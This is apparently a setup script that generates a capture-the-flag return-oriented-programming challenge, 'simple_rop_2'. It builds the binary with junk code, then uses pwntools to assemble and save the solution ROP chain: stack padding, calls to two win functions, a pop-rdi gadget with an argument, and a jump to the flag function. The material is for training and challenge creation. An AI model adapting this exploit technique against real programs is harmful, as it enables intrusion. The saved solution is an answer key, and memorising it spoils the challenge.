import subprocess
import os
import sys
                    # chals_out/chal_name/team_name so 3
sys.path.insert(1, os.path.join(sys.path[0], '../../..'))
from libchals import *
from pwn import *

# junk code generation
#write_junk_calls("main.c", 31, 2)
#write_junk_calls("main.c", 22)
write_junk_body("main.c", 16)

subprocess.call("make")



from pwn import *
# input correction
elf = ELF("simple_rop_2")
rop = ROP(elf)
win1 = elf.symbols['win_function1']
win2 = elf.symbols['win_function2']
flag = elf.symbols['flag']
POP_ONCE = (rop.find_gadget(['pop rdi', 'ret']))[0]
RET = (rop.find_gadget(['ret']))[0]

padding = b'A' * 24

exploit = padding + p64(win1) + p64(win2)
exploit += p64(POP_ONCE) + p64(0xABADBABE) + p64(RET) + p64(flag)
# rop is saved as input
f = open("input", "wb")
f.write(exploit)
f.close()

# strip it after the ropchain building so they don't have the symbols but we do
#subprocess.call(["strip", "simple_rop_2"])


#os.remove("main.c")
os.remove("Makefile")
os.remove("setup.py")
# solution
#os.remove("input")
